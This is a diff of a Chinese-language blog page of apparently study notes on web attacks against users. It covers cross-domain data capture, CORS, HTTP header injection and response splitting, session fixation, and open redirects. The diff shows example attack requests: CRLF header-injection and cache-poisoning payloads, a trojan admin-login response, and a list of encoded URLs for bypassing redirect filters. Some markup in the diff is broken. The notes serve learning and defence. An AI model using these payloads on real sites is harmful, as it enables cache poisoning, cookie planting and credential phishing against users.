 <p>如果用户在访问攻击者页面的同时，还登录了某个易受攻击的应用程序，则攻击者的页面将动态地插入包含用户个人信息的脚本</p>
 <h4 id="变量分配"><a href="#变量分配" class="headerlink" title="变量分配"></a>变量分配</h4><p>以一个社交网络应用程序为例，一部分用户界面使用动态生成的脚本加载，为防止标准的CSRF攻击，这些脚本中包含了反CSRF令牌。利用在动态脚本中插入这些令牌导致的漏洞，攻击者可以通过跨域包含相关脚本来捕获令牌。<br>例如，假设wahh-network.com上的应用程序返回包含以下代码的脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">var nonce=<span class="string">'123456789'</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>.
+var nonce<span class="token operator">=</span><span class="token string">'123456789'</span><span class="token punctuation">;</span>
+<span class="token punctuation">..</span>.</code></pre>
 <p>一个用于跨域捕获nonce值的简单概念验证机制如下所示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://wahh-network.com/status"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(nonce);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://wahh-network.com/status"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
 <h4 id="E4X"><a href="#E4X" class="headerlink" title="E4X"></a>E4X</h4><p>E4X是对ECMAScript语言(包括JavaScript)的扩展，后者可为XML语言添加本地支持。<br>除了允许在JavaScript中直接使用XML语法外，用户还可以在E4X中嵌入代码，以调用XML中的JavaScript</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var foo=&lt;bar&gt;&#123;prompt(<span class="string">'Please enter the value of bar.'</span>)&#125;&lt;/bar&gt;;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">var foo<span class="token operator">=</span><span class="token operator">&lt;</span>bar<span class="token operator">></span><span class="token punctuation">{</span>prompt<span class="token punctuation">(</span><span class="token string">'Please enter the value of bar.'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>/bar<span class="token operator">></span><span class="token punctuation">;</span></code></pre>
 <p>E4X的这些特性导致了两个严重的后果，可用于实施跨域捕获攻击：</p>
 <ul>
 <li>结构正确的XML标记将被视为不会分配给任何变量的值</li>
@@ -525,16 +589,35 @@
 <li>Flash提供了一种机制，各种域可通过这种机制向来自其他域的Flash对象授予权限，以便于这些对象能与它们进行完全双向的交互。通常，授予权限的域会在URL/crossdomain.xml处发布一个策略文件，从而完成这一任务。当某个Flash对象尝试提出双向跨域请求时，Flash浏览器扩展将检索所请求的域中的策略文件，并仅在所请求的域授权对提出请求的域的访问权限时，才允许上述请求。</li>
 </ul>
 <p>由<a href="http://www.adobe.com" target="_blank" rel="noopener">www.adobe.com</a> 发布的Flash策略如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">    &lt;site-control permitted-cross-domain-policies=<span class="string">"by-content-type"</span>/&gt;</span><br><span class="line">    &lt;allow-access-from domain=<span class="string">"*.macromedia.com"</span> /&gt;</span><br><span class="line">    &lt;allow-access-from domain=<span class="string">"*.adobe.com"</span> /&gt;</span><br><span class="line">    &lt;allow-access-from domain=<span class="string">"*.photoshop.com"</span> /&gt;</span><br><span class="line">    &lt;allow-access-from domain=<span class="string">"*.acrobat.com"</span> /&gt;</span><br><span class="line"> &lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span>cross-domain-policy<span class="token operator">></span>
+    <span class="token operator">&lt;</span>site-control permitted-cross-domain-policies<span class="token operator">=</span><span class="token string">"by-content-type"</span>/<span class="token operator">></span>
+    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.macromedia.com"</span> /<span class="token operator">></span>
+    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.adobe.com"</span> /<span class="token operator">></span>
+    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.photoshop.com"</span> /<span class="token operator">></span>
+    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.acrobat.com"</span> /<span class="token operator">></span>
+ <span class="token operator">&lt;</span>/cross-domain-policy<span class="token operator">></span></code></pre>
 <h4 id="同源策略和Silverlight"><a href="#同源策略和Silverlight" class="headerlink" title="同源策略和Silverlight"></a>同源策略和Silverlight</h4><ul>
 <li>用于Silverlight的同源策略很大程度基于由Flash实施的策略。</li>
 <li>Silverlight和Flash的一个重要区别在于，Silverlight不会基于协议或端口隔离来源，因此通过HTTP加载的对象可以与同一个域上的HTTPS URL交互。</li>
 <li>Silverlight使用自己的跨域策略文件，地址为/clientaccesspolicy.xml。</li>
 </ul>
 <p>由<a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a> 发布的Silverlight同源策略如下所示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;access-policy&gt;</span><br><span class="line">   &lt;cross-domain-access&gt;</span><br><span class="line">     &lt;policy&gt;</span><br><span class="line">      &lt;allow-from&gt;</span><br><span class="line">      &lt;domain uri=<span class="string">"http://www.microsoft.com"</span> /&gt;</span><br><span class="line">      &lt;domain uri=<span class="string">"http://i.microsoft.com"</span> /&gt;</span><br><span class="line">      &lt;domain uri=<span class="string">"http://i2.microsoft.com"</span> /&gt;</span><br><span class="line">      &lt;/allow-from&gt;</span><br><span class="line">      &lt;grant-to&gt;</span><br><span class="line">       &lt;resource path=<span class="string">"/"</span> include-subpaths=<span class="string">"true"</span> /&gt;</span><br><span class="line">      &lt;/grant-to&gt;</span><br><span class="line">     &lt;/policy&gt;</span><br><span class="line">    &lt;/cross-domain-access&gt;</span><br><span class="line">&lt;/access-policy&gt;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>access-policy<span class="token operator">></span>
+   <span class="token operator">&lt;</span>cross-domain-access<span class="token operator">></span>
+     <span class="token operator">&lt;</span>policy<span class="token operator">></span>
+      <span class="token operator">&lt;</span>allow-from<span class="token operator">></span>
+      <span class="token operator">&lt;</span>domain uri<span class="token operator">=</span><span class="token string">"http://www.microsoft.com"</span> /<span class="token operator">></span>
+      <span class="token operator">&lt;</span>domain uri<span class="token operator">=</span><span class="token string">"http://i.microsoft.com"</span> /<span class="token operator">></span>
+      <span class="token operator">&lt;</span>domain uri<span class="token operator">=</span><span class="token string">"http://i2.microsoft.com"</span> /<span class="token operator">></span>
+      <span class="token operator">&lt;</span>/allow-from<span class="token operator">></span>
+      <span class="token operator">&lt;</span>grant-to<span class="token operator">></span>
+       <span class="token operator">&lt;</span>resource path<span class="token operator">=</span><span class="token string">"/"</span> include-subpaths<span class="token operator">=</span><span class="token string">"true"</span> /<span class="token operator">></span>
+      <span class="token operator">&lt;</span>/grant-to<span class="token operator">></span>
+     <span class="token operator">&lt;</span>/policy<span class="token operator">></span>
+    <span class="token operator">&lt;</span>/cross-domain-access<span class="token operator">></span>
+<span class="token operator">&lt;</span>/access-policy<span class="token operator">></span></code></pre>
 <h4 id="同源策略与Java"><a href="#同源策略与Java" class="headerlink" title="同源策略与Java"></a>同源策略与Java</h4><p>Java同源策略的一个重要不同在于：某些情况下，与来源域共享的IP地址的其他域将被视为“同源”</p>
 <h3 id="同源策略与HTML5"><a href="#同源策略与HTML5" class="headerlink" title="同源策略与HTML5"></a>同源策略与HTML5</h3><p>在HTML5中，可以与其他域进行双向交互，前提是被访问的域为交互提供权限。<br>跨域交互的权限通过一系列新的HTTP消息头来实现，如果某个脚本尝试使用XMLHttpRequest提出跨域请求，处理该请求的方式因请求的具体内容而异：</p>
 <ul>
@@ -542,40 +625,74 @@
 <li>其他无法使用现有的HTML生成的请求，如那些非标准HTTP方法或Content-Type、或添加了定制HTTP消息头的请求，将进行不同的处理。浏览器会首先向目标URL提出一个OPTIONS请求，然后检查响应的消息头，以确定是否应允许那些请求。</li>
 </ul>
 <p>在两种情况下，浏览器都会添加一个Origin消息头，用于指示尝试提出跨域请求的域。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: http://wahh-app.com</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">Origin: http://wahh-app.com</code></pre>
 <p>要确定可能执行双向交互的域，服务器的响应中应包含<font color="#fb8c00">Access-Control-Allow-Origin</font>&gt;消息头，其中包含以逗号分隔的允许的域列表和通配符。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">Access-Control-Allow-Origin: *</code></pre>
 <p>在第二种情况下，如果已使用POTIONS请求预先验证了跨域请求，则可以使用以下消息头来指示尝试提出的请求的具体内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: X-PINGOTHER</code></pre>
 <h2 id="其他客户端注入攻击"><a href="#其他客户端注入攻击" class="headerlink" title="其他客户端注入攻击"></a>其他客户端注入攻击</h2><h3 id="HTTP消息头注入"><a href="#HTTP消息头注入" class="headerlink" title="HTTP消息头注入"></a>HTTP消息头注入</h3><p>如果攻击者能够在他控制的消息头中注入换行符，他就能在响应中插入其他HTTP消息头、并在响应主体中写入任意内容。这种漏洞最常见于<font color="#fb8c00">Location和Set-Cookie</font>消息头中</p>
 <p>同样，一些应用程序提取用户提交的输入，并将其插入到cookie值中：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /settings/Default.aspx?Language=Chinese HTTP/1.1</span><br><span class="line">HOst:mdsec.net</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie:PrefereredLanguage=Chinese </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese HTTP/1.1
+HOst:mdsec.net</code></pre>
+<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OK
+Set-Cookie:PrefereredLanguage<span class="token operator">=</span>Chinese 
+<span class="token punctuation">..</span>.</code></pre>
 <p>在上述的任何一种情况下，攻击者都可以使用回车符(0x0d)或换行符(0x0a)构造一个专门设计的请求，在他们控制的消息头中注入一个换行符，从而在下面的行中注入其他数据。如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /settings/Default.aspx?Language=Chinese%0d%0aFoo:+bar HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: PrefereredLanguage=Chinese</span><br><span class="line">Foo: bar</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aFoo:+bar HTTP/1.1
+Host: mdsec.net</code></pre>
+<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OK
+Set-Cookie: PrefereredLanguage<span class="token operator">=</span>Chinese
+Foo: bar
+<span class="token punctuation">..</span>.</code></pre>
 <h4 id="利用消息头注入漏洞"><a href="#利用消息头注入漏洞" class="headerlink" title="利用消息头注入漏洞"></a>利用消息头注入漏洞</h4><p>如果能够在响应中注入任意消息头和消息主体的内容，那么这种行为可通过各种方式攻击应用程序</p>
 <h5 id="注入cookie"><a href="#注入cookie" class="headerlink" title="注入cookie"></a>注入cookie</h5><p>攻击者可以建立一个URL,在请求它的任何用户的浏览器中设定任意的cookie：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /settings/Default.aspx?Language=Chinese%0d%0aSet-Cookie:+sessId%3d120a12f98e8; HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: PrefereredLanguage</span><br><span class="line">Set-Cookie: sessId=120a12f98e8</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aSet-Cookie:+sessId%3d120a12f98e8<span class="token punctuation">;</span> HTTP/1.1
+Host: mdsec.net</code></pre>
+<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OK
+Set-Cookie: PrefereredLanguage
+Set-Cookie: sessId<span class="token operator">=</span>120a12f98e8
+<span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>
 <p>如果进行适当的配置，这些cookie可以访问不同的浏览器会话。这时，通过前面利用反射型XSS漏洞时使用的相同传送机制(电子邮件、第三方Web站点等)，就可以诱使目标用户访问恶意URL。</p>
 <h5 id="传送其他攻击"><a href="#传送其他攻击" class="headerlink" title="传送其他攻击"></a>传送其他攻击</h5><p>因为HTTP消息头注入允许攻击者控制整个响应主体，所以几乎任何针对其他用户的攻击都可以使用它来作为传送机制。</p>
 <h5 id="HTTP响应分隔-HTTP-response-splitting"><a href="#HTTP响应分隔-HTTP-response-splitting" class="headerlink" title="HTTP响应分隔(HTTP response splitting)"></a>HTTP响应分隔(HTTP response splitting)</h5><p>这是一种企图“毒害”代理服务器缓存，从而攻破代理服务器访问应用程序的其他用户的技巧。<br>攻击者可以通过以下步骤，利用消息头注入漏洞来实施响应分割攻击：</p>
 <ol>
-<li><p>攻击者在代理服务器中选择一个他希望“毒害”的应用程序页面。例如，他可能会使用一个木马登录表单(用于向攻击者的服务器提交用户证书)代替/admin/处的页面</p>
+<li>攻击者在代理服务器中选择一个他希望“毒害”的应用程序页面。例如，他可能会使用一个木马登录表单(用于向攻击者的服务器提交用户证书)代替/admin/处的页面</li>
+<li>攻击者确定某个消息头注入漏洞，构造一个请求，在服务器响应中注入一个完整的HTTP主体以及一组响应消息头和另一个消息响应主体。第二个响应主体包含他的木马登录表单的HTML源代码。这样，服务器的响应就像是两个连接起来的单独的HTTP响应。<pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aContent-Length:+22%0d%0a%0d%0a
+<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0afoo%0d%0a<span class="token operator">&lt;</span>/html<span class="token operator">></span>%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a
+<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0a<span class="token operator">&lt;</span>head<span class="token operator">></span>%0a%0a<span class="token operator">&lt;</span>title<span class="token operator">></span>Administrator+login<span class="token operator">&lt;</span>/title<span class="token operator">></span>%0d%0a<span class="token punctuation">[</span><span class="token punctuation">..</span>.long URL<span class="token punctuation">..</span>.<span class="token punctuation">]</span> HTTP/1.1
+Host: mdsec.net</code></pre>
+<pre class=" language-bash"><code class="language-bash">//第一个响应
+HTTP/1.1 200 OK
+Set-Cookie： PrefereredLanguage<span class="token operator">=</span>Chinese
+Content-Length: 22
+</code></pre>
 </li>
-<li><p>攻击者确定某个消息头注入漏洞，构造一个请求，在服务器响应中注入一个完整的HTTP主体以及一组响应消息头和另一个消息响应主体。第二个响应主体包含他的木马登录表单的HTML源代码。这样，服务器的响应就像是两个连接起来的单独的HTTP响应。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /settings/Default.aspx?Language=Chinese%0d%0aContent-Length:+22%0d%0a%0d%0a</span><br><span class="line">&lt;html&gt;%0d%0afoo%0d%0a&lt;/html&gt;%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a</span><br><span class="line">&lt;html&gt;%0d%0a&lt;head&gt;%0a%0a&lt;title&gt;Administrator+login&lt;/title&gt;%0d%0a[...long URL...] HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//第一个响应</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie： PrefereredLanguage=Chinese</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">foo</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//第二个响应</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length:2307</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Administrator login&lt;/title&gt;</span><br></pre></td></tr></table></figure>
-</li>
+</ol>
+<html>
+foo
+</html>
+//第二个响应
+HTTP/1.1 200 OK
+Content-Length:2307
+
+<html>
+<head>
+<title>Administrator login</title>
+```
+
+<ol start="3">
 <li><p>攻击者与代理服务器建立TCP连接。传送这个专门设计的请求，后面紧跟着访问被“毒害”的页面的请求。在HTTP中，以这种方式连接请求的方式是合法的</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//第一个请求</span><br><span class="line">GET /settings/Default.aspx?Language=Chinese%0d%0aContent-Length:+22%0d%0a%0d%0a</span><br><span class="line">&lt;html&gt;%0d%0afoo%0d%0a&lt;/html&gt;%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a</span><br><span class="line">&lt;html&gt;%0d%0a&lt;head&gt;%0a%0a&lt;title&gt;Administrator+login&lt;/title&gt;%0d%0a[...long URL...] HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Proxy-Connection: Keep-alive</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//第二个请求</span><br><span class="line">GET http://mdsec.net/admin/ HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Proxy-Connection: Close</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">//第一个请求
+GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aContent-Length:+22%0d%0a%0d%0a
+<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0afoo%0d%0a<span class="token operator">&lt;</span>/html<span class="token operator">></span>%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a
+<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0a<span class="token operator">&lt;</span>head<span class="token operator">></span>%0a%0a<span class="token operator">&lt;</span>title<span class="token operator">></span>Administrator+login<span class="token operator">&lt;</span>/title<span class="token operator">></span>%0d%0a<span class="token punctuation">[</span><span class="token punctuation">..</span>.long URL<span class="token punctuation">..</span>.<span class="token punctuation">]</span> HTTP/1.1
+Host: mdsec.net
+Proxy-Connection: Keep-alive</code></pre>
+<pre class=" language-bash"><code class="language-bash">//第二个请求
+GET http://mdsec.net/admin/ HTTP/1.1
+Host: mdsec.net
+Proxy-Connection: Close </code></pre>
 </li>
 <li><p>代理服务器与应用程序建立TCP连接，送出这两个以相同的方式连接的请求。</p>
 </li>
@@ -617,7 +734,7 @@
 <li><p>如果在URL参数中传送会话令牌，则攻击者只需向受害者传递应用程序向攻击中发布的同一URL</p>
 </li>
 <li><p>一些应用程序接受在URL中使用分号来分隔会话令牌</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httP://wahh-app.com/product.do;jsessionid=739105723F7AEE6ABC213F812C184204.ASTPESD2</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">httP://wahh-app.com/product.do<span class="token punctuation">;</span>jsessionid<span class="token operator">=</span>739105723F7AEE6ABC213F812C184204.ASTPESD2</code></pre>
 </li>
 <li><p>如果应用程序使用隐藏的表单字段传送会话令牌，攻击者可以通过CSRF攻击在用户的浏览器中拆入他的令牌</p>
 </li>
@@ -639,23 +756,51 @@
 <h4 id="查找并利用开放式重定向漏洞"><a href="#查找并利用开放式重定向漏洞" class="headerlink" title="查找并利用开放式重定向漏洞"></a>查找并利用开放式重定向漏洞</h4><p>查找重定向漏洞的第一步是确认应用程序中的所有重定向。应用程序可以通过以下几种方式使用户的浏览器重定向到不同的URL：</p>
 <ul>
 <li><p>HTTP重定向使用一条状态码为3xx的消息与一个指向重定向目标的Location消息头，如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Object moved</span><br><span class="line">Location: http://wahh-app.com/updates.html</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">HTTP/1.1 302 Object moved
+Location: http://wahh-app.com/updates.html</code></pre>
 </li>
 <li><p>HTTP Refresh消息头可在固定时间间隔后使用任意URL重新加载某个页面，该间隔可以为(0)，也就是立即触发重定向，如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Refresh: 0; url=http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OK
+Refresh: 0<span class="token punctuation">;</span> url<span class="token operator">=</span>http://www.baidu.com</code></pre>
 </li>
 <li><p>HTML的&lt; meta&gt;标签可用于复制任何HTTP消息头的行为，因此可用于重定向：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;me ta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://www.baidu.com"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>JavaScript的各种API可用于将浏览器重定向到任意URL</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"> &lt;!--document.location=<span class="string">"http://www.baidu.com"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OK
+Content-Length: 125
+</code></pre>
 </li>
 </ul>
+<html>
+<head>
+<me ta http-equiv="refresh" content="0;url=http://www.baidu.com">
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</html>
+```
+
+<ul>
+<li>JavaScript的各种API可用于将浏览器重定向到任意URL<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OK
+Content-Length: 120
+</code></pre>
+</li>
+</ul>
+<html>
+<head>
+<script>
+ <!--document.location="http://www.baidu.com";
+</script>
+</head>
+</html>
+```
+
 <h4 id="防止开放式重定向漏洞"><a href="#防止开放式重定向漏洞" class="headerlink" title="防止开放式重定向漏洞"></a>防止开放式重定向漏洞</h4><p>以下这种情况很常见：用户控制的数据用于设置重定向的目标，但却被应用程序以某种方式过滤或净化掉，一阻止重定攻击。因此，接下来应该确认应用程序能否避开防御机制执行任意重定向。通常会遇到以下两种情况：尝试阻止绝对URL，附加一个特殊的绝对URL前缀。</p>
 <h5 id="阻止绝对URL"><a href="#阻止绝对URL" class="headerlink" title="阻止绝对URL"></a>阻止绝对URL</h5><p>应用程序可能会检查用户提交的字符串是否以http://开头，如果是，就阻止该请求。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> HtTp://www. baidu.com</span><br><span class="line">%00http://www. baidu.com</span><br><span class="line">//www. baidu.com</span><br><span class="line">%68%74%74%70%3a%2f%2fwww. baidu.com </span><br><span class="line">%2568%2574%2574%2570%253a%252f%252fwww. baidu.com</span><br><span class="line">https://www. baidu.com</span><br><span class="line">http:\\www. baidu.com</span><br><span class="line">https:///www. baidu.com</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash"> HtTp://www. baidu.com
+%00http://www. baidu.com
+//www. baidu.com
+%68%74%74%70%3a%2f%2fwww. baidu.com 
+%2568%2574%2574%2570%253a%252f%252fwww. baidu.com
+https://www. baidu.com
+http:\\www. baidu.com
+https:///www. baidu.com</code></pre>
 <h4 id="防止开放式重定向漏洞-1"><a href="#防止开放式重定向漏洞-1" class="headerlink" title="防止开放式重定向漏洞"></a>防止开放式重定向漏洞</h4><p>绝不将用户提交的数据合并到重定向目标中，是避免开放式重定向漏洞的最有效方法。但我们可以找到替代的方法，可能的替代方法如下：</p>
 <ul>
 <li>从应用程序中删除重定向页面，用直接指向相关目标URL的链接代替指向重定向页面的链接</li>
@@ -677,7 +822,9 @@
 <li>Web邮件应用程序，这类应用程序将用户的联系人信息存储在本地数据库中，在离线模式下运行时，则存储待发邮件以便于稍后发送。</li>
 </ul>
 <h2 id="攻击浏览器"><a href="#攻击浏览器" class="headerlink" title="攻击浏览器"></a>攻击浏览器</h2><h3 id="记录键击"><a href="#记录键击" class="headerlink" title="记录键击"></a>记录键击</h3><p>JavaScript可在浏览器窗口处于激活状态时监控用户按下的所有键，包括密码、私人信息和其他个人信息。下面的概念验证脚本将截获IE中所有的键击，并在浏览器状态栏中显示全部内容：</p>
